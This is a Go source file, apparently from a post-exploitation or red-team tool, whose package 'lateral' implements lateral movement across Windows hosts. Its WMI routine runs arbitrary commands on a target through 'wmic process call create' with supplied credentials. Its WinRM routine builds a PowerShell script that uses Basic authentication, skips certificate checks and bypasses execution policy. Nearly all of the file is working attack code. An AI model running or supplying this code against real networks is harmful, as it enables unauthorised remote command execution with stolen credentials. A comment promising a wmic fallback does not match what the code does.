package lateral

import (
	"fmt"
)

// moveViaWMI 通过 WMI 执行横向移动
func (lm *LateralMover) moveViaWMI(req MoveRequest) MoveResult {
	result := MoveResult{
		Method: MethodWMI,
		Target: getTargetAddress(req.Target),
	}

	if err := validateRequest(req); err != nil {
		result.Error = err
		result.Message = err.Error()
		return result
	}

	targetAddr := getTargetAddress(req.Target)
	credStr := buildCredString(req.Credentials)

	args := []string{
		"/node:" + targetAddr,
		"/user:" + credStr,
		"/password:" + req.Credentials.Password,
		"process",
		"call",
		"create",
		req.Command,
	}

	output, err := lm.execCommand("wmic", args...)
	result.Output = sanitizeOutput(output)

	if err != nil {
		result.Success = false
		result.Error = err
		result.Message = fmt.Sprintf("WMI execution failed: %v", err)
		return result
	}

	if contains(output, "Successful") || contains(output, "ReturnValue = 0") {
		result.Success = true
		result.Message = "Command executed successfully via WMI"
	} else {
		result.Success = false
		result.Message = "WMI execution may have failed"
	}

	return result
}

// moveViaWinRM 通过 WinRM 执行横向移动
func (lm *LateralMover) moveViaWinRM(req MoveRequest) MoveResult {
	result := MoveResult{
		Method: MethodWinRM,
		Target: getTargetAddress(req.Target),
	}

	if err := validateRequest(req); err != nil {
		result.Error = err
		result.Message = err.Error()
		return result
	}

	targetAddr := getTargetAddress(req.Target)
	credStr := buildCredString(req.Credentials)

	// 使用 Basic 认证和允许未加密连接
	psScript := fmt.Sprintf(`
		[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
		$pass = ConvertTo-SecureString "%s" -AsPlainText -Force;
		$cred = New-Object System.Management.Automation.PSCredential("%s", $pass);
		$option = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck;
		
		# 方法1: 尝试基本认证
		try {
			Invoke-Command -ComputerName %s -Credential $cred -Authentication Basic -SessionOption $option -ScriptBlock { %s }
		} catch {
			# 方法2: 尝试使用 Enter-PSSession 方式
			try {
				$session = New-PSSession -ComputerName %s -Credential $cred -Authentication Basic -SessionOption $option
				Invoke-Command -Session $session -ScriptBlock { %s }
				Remove-PSSession $session
			} catch {
				# 方法3: 直接使用 wmic 远程执行（备用）
				Write-Output "WinRM failed, command not executed: %s"
				throw $_.Exception
			}
		}
	`, req.Credentials.Password, credStr, targetAddr, req.Command, targetAddr, req.Command, req.Command)

	args := []string{
		"-ExecutionPolicy", "Bypass",
		"-NoProfile",
		"-Command", psScript,
	}

	output, err := lm.execCommand("powershell.exe", args...)
	result.Output = sanitizeOutput(output)

	if err != nil {
		result.Success = false
		result.Error = err
		result.Message = fmt.Sprintf("WinRM execution failed: %v", err)
		return result
	}

	result.Success = true
	result.Message = "Command executed successfully via WinRM"
	return result
}

// contains 检查字符串是否包含子串（不区分大小写）
func contains(s, substr string) bool {
	s = toLower(s)
	substr = toLower(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func toLower(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		if s[i] >= 'A' && s[i] <= 'Z' {
			result[i] = s[i] + 32
		} else {
			result[i] = s[i]
		}
	}
	return string(result)
}
